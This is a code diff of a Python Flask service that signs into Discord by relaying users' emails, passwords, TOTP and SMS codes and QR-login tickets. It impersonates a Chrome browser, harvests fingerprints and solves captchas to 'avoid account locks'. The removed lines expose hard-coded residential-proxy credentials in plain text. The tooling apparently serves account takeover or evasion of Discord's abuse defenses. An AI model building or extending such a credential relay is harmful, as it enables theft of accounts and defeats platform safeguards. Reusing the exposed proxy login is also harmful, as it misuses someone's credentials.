@@ -40,12 +40,6 @@ SEC_CH_UA          = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_V
 SEC_CH_UA_MOBILE   = '?0'
 SEC_CH_UA_PLATFORM = '"Windows"'
 
-# Proxy
-PX_URL  = 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000'
-PX_HOST = 'la.residential.rayobyte.com'
-PX_PORT = 8000
-PX_AUTH = ('henchmanbobby_gmail_com', 'Fatman11')
-
 # Captcha solving (capsolver.com or 2captcha.com)
 CAPTCHA_KEY     = os.environ.get('CAPTCHA_KEY', '')
 CAPTCHA_SERVICE = os.environ.get('CAPTCHA_SERVICE', 'capsolver')  # 'capsolver' or '2captcha'
@@ -105,16 +99,13 @@ class DiscordSession:
     visits the login page first to get cookies, then fetches X-Fingerprint.
     This mimics a real browser and avoids account locks.
     """
-    def __init__(self, use_proxy=True):
+    def __init__(self):
         self.s = creq.Session(impersonate='chrome')
         self.fingerprint = None
         self.cookies_ready = False
-        self.proxy = PX_URL if use_proxy else None
 
     def prepare(self):
         """Step 1: Visit login page → cookies.  Step 2: /experiments → fingerprint."""
-        px = {'https': self.proxy, 'http': self.proxy} if self.proxy else None
-
         # Step 1: GET /login — Cloudflare sets __dcfduid, __sdcfduid, __cfruid, locale
         try:
             r = self.s.get('https://discord.com/login', headers={
@@ -129,7 +120,7 @@ class DiscordSession:
                 'Sec-Fetch-Site': 'none',
                 'Sec-Fetch-User': '?1',
                 'Upgrade-Insecure-Requests': '1',
-            }, proxies=px, timeout=15)
+            }, timeout=15)
             self.cookies_ready = r.status_code == 200
             print(f'[*] Login page: {r.status_code}, cookies: {list(self.s.cookies.keys())}')
         except Exception as e:
@@ -151,7 +142,7 @@ class DiscordSession:
                 'Sec-Fetch-Mode': 'cors',
                 'Sec-Fetch-Site': 'same-origin',
                 'X-Track': sprops(),
-            }, proxies=px, timeout=15)
+            }, timeout=15)
             if r2.status_code == 200:
                 self.fingerprint = r2.json().get('fingerprint')
                 print(f'[*] Fingerprint: {self.fingerprint[:20]}...' if self.fingerprint else '[!] No fingerprint in response')
@@ -188,12 +179,10 @@ class DiscordSession:
         return h
 
     def post(self, path, json_data, timeout=30):
-        px = {'https': self.proxy, 'http': self.proxy} if self.proxy else None
         return self.s.post(
             f'{API}{path}',
             headers=self._headers(),
             json=json_data,
-            proxies=px,
             timeout=timeout
         )
 
@@ -417,7 +406,7 @@ class QRAuth:
 
 def _qr_worker(s: QRAuth):
     # For the QR ticket exchange, create a stealth session
-    ds = DiscordSession(use_proxy=True)
+    ds = DiscordSession()
     ds.prepare()
 
     try:
@@ -495,12 +484,7 @@ def _qr_worker(s: QRAuth):
             header=[f'Origin: https://discord.com', f'User-Agent: {UA}'],
         )
         s.ws = ws
-        ws.run_forever(
-            http_proxy_host=PX_HOST,
-            http_proxy_port=PX_PORT,
-            http_proxy_auth=PX_AUTH,
-            proxy_type='http',
-        )
+        ws.run_forever()
     except Exception as e:
         s.st = 'error'; s.err = str(e); s._stop.set()
 
@@ -530,10 +514,10 @@ def api_login():
         # Determine starting session: fresh or restored from captcha flow
         if captcha_key_in and session_id and session_id in login_sessions:
             stored = login_sessions.pop(session_id)
-            # Try reusing the SAME session object (preserves proxy connection → same IP)
+            # Try reusing the SAME session object (preserves connection → same IP)
             ds = stored.get('session')
             if ds is None:
-                ds = DiscordSession(use_proxy=True)
+                ds = DiscordSession()
                 ds.s = creq.Session(impersonate='chrome')
                 ds.restore(stored.get('snap', {}))
             payload = {
@@ -547,7 +531,7 @@ def api_login():
             print(f'    captcha_key={captcha_key_in[:50]}...')
             print(f'    cookies={list(ds.s.cookies.keys())}, fp={ds.fingerprint[:20] if ds.fingerprint else "NONE"}')
         else:
-            ds = DiscordSession(use_proxy=True)
+            ds = DiscordSession()
             ds.prepare()
             payload = {
                 'login': login_email, 'password': login_pw,
@@ -564,7 +548,7 @@ def api_login():
                 print(f'[!] Connection error (attempt {attempt+1}): {conn_err}')
                 # Stale proxy connection — create fresh session, restore identity
                 snap = ds.snapshot()
-                ds = DiscordSession(use_proxy=True)
+                ds = DiscordSession()
                 ds.s = creq.Session(impersonate='chrome')
                 ds.restore(snap)
                 r = ds.post('/auth/login', payload)
@@ -599,7 +583,7 @@ def api_login():
 
                 # Fresh connection but preserve cookies + fingerprint
                 snap = ds.snapshot()
-                ds = DiscordSession(use_proxy=True)
+                ds = DiscordSession()
                 ds.s = creq.Session(impersonate='chrome')
                 ds.restore(snap)
                 continue  # retry with solved captcha
@@ -647,7 +631,7 @@ def api_login():
 def api_mfa_totp():
     d = request.json
     try:
-        ds = DiscordSession(use_proxy=True)
+        ds = DiscordSession()
         ds.prepare()
         r = ds.post('/auth/mfa/totp', {
             'code': d.get('code'), 'ticket': d.get('ticket'),
@@ -667,7 +651,7 @@ def api_mfa_totp():
 def api_mfa_sms_send():
     d = request.json
     try:
-        ds = DiscordSession(use_proxy=True)
+        ds = DiscordSession()
         ds.prepare()
         r = ds.post('/auth/mfa/sms/send', {'ticket': d.get('ticket')})
         return jsonify(r.json()), r.status_code
@@ -679,7 +663,7 @@ def api_mfa_sms_send():
 def api_mfa_sms_verify():
     d = request.json
     try:
-        ds = DiscordSession(use_proxy=True)
+        ds = DiscordSession()
         ds.prepare()
         r = ds.post('/auth/mfa/sms', {
             'code': d.get('code'), 'ticket': d.get('ticket'),
